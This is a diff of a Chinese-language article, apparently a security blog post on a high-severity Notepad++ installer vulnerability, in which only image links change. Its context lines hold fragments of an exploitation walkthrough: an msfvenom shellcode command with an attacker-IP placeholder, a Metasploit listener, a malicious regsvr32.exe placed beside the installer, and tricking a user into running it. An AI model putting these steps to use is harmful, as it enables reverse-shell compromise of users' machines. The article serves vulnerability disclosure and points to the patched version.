@@ -72,7 +72,7 @@ CVSS 8.1 高危漏洞
   
 ▍关于Notepad++  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/2FibdfL4fGpSib6fTcIicVqrLg3FiaqdwQnOtjoeLUHkibHFxiczibU2runk1fGZGxVYnu9oNBsLFHQx5akDHE6DVKrAQ/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/a87a12ebf2226ae57df6c76e6724c67249a5024c512efa672fa408703b93bd3c.png "")  
   
   
 Notepad++ 是Windows平台广泛使用的开源文本编辑器，支持多种编程语言语法高亮、代码折叠和插件扩展。  
@@ -126,7 +126,7 @@ LHOST=攻击者IP LPORT=监听端口 -f c >shellcode.txt
   
 此命令生成C格式的Shellcode，用于后续编译恶意程序。  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/2FibdfL4fGpSib6fTcIicVqrLg3FiaqdwQnOld3AbezmErJH4yVrK2l1dbynfWeobxm1kpDyuU64hZ71coia0pDF3SQ/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/ded1e01814fbf77c591a58e2fd9104bd2fc8e8a2628171a1503b7f13ba021781.png "")  
   
   
 ▍步骤2：编译恶意程序  
@@ -151,7 +151,7 @@ set LPORT 监听端口
   
 run  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/2FibdfL4fGpSib6fTcIicVqrLg3FiaqdwQnOm9gZL4mknMB6Iz1PQPB9ibgibZDXtytLia4hurj4dAUrdvVX6ngjic6I6Q/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/e8c64bbb7918cfa6c9e290ed8fa6644350b0323607096032786709795cfcc89c.png "")  
   
   
 在攻击机器上设置Metasploit监听，等待受害者连接。  
@@ -164,14 +164,14 @@ notepad++_installer.exe
 regsvr32.exe  
 放入同一目录  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/2FibdfL4fGpSib6fTcIicVqrLg3FiaqdwQnOGiauC9VhnSdL0ZO0yHI75Mfx3NF1A7icibkcmjZgiaWz2FLxEx6zj6n74g/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/a03863fb190b97b6835c15f2925acab806f4c0ae834a31b96a949a77d9a0faf9.png "")  
   
   
 2. 诱骗用户运行安装程序  
   
 3. 当安装过程卡住时，攻击已完成  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/2FibdfL4fGpSib6fTcIicVqrLg3FiaqdwQnOkATiacsUbH5y1f8w1CgELuUy6BCdznxVeMEUhSRlUiaQInP5d8TdQuoA/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/b73550b70a0d109bf8af24f53d844d89909453a3c560ea9d7eedced431a42093.png "")  
   
   
 [安装程序卡住时的界面截图位置]  
@@ -234,7 +234,7 @@ https://notepad-plus-plus.org
   
 下载Notepad++ 8.8.2查看CVE详情  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/2FibdfL4fGpSib6fTcIicVqrLg3FiaqdwQnOpXEyEyIE1YyAU6SHqau4AmZISeuJgcDdiaT585FQdWnicZXhUC6nxsXg/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/f21af5273db2ef7dd35a7a0ea16ca2e90373979c73807a484b7c29f7e1039dd1.png "")  
   
   
 安全研究仅供参考 | 请遵守网络安全法律法规  
